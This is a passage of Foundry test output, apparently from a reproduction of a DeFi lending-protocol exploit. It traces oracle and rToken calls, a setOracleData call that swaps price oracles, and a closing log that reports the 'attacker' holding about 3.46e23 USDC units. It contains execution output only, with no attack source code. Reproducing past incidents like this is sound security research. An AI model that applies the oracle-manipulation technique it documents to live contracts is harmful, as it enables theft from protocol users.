    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5934] 0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5::getUnderlyingPrice(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1140] 0x51597f405303C4377E36123cBc172b13269EA163::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [298] 0x7008fDEd94a8Ce68D01FEB633C4D81C2be7a1B20::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3143] 0x51597f405303C4377E36123cBc172b13269EA163::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1410] 0x7008fDEd94a8Ce68D01FEB633C4D81C2be7a1B20::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 649, 99995104 [9.999e7], 1649922650 [1.649e9], 1649922650 [1.649e9], 649
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36893488147419103881 [3.689e19], 99995104 [9.999e7], 1649922650 [1.649e9], 1649922650 [1.649e9], 36893488147419103881 [3.689e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 999951040000000000 [9.999e17]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [344] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::totalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 3375629105537794635468238333213868 [3.375e33]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4661] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2232] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::delegateToImplementation(0x70a082310000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [575] 0x74D4b75C3953d7f1019F51F2262750a8C0F8C4A6::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DistributedSupplierRifi(rToken: 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5, supplier: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], rifiDelta: 0, rifiSupplyIndex: 1000000000053275236089372770968705312 [1e36])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6661] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4232] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::delegateToImplementation(0x70a082310000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f38) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2575] 0x74D4b75C3953d7f1019F51F2262750a8C0F8C4A6::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DistributedSupplierRifi(rToken: 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5, supplier: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], rifiDelta: 0, rifiSupplyIndex: 1000000000053275236089372770968705312 [1e36])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 0)
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в””в”Ђ в†ђ [Return] true
    в”њв”Ђ [582] 0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5::setOracleData(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA, 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [1296] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”њв”Ђ emit log_named_uint(key: "After exploit, USDC balance of attacker:", val: 346199780826500224370302 [3.461e23])
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.08s (3.74s CPU time)

Ran 2 test suites in 4.33s (4.30s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
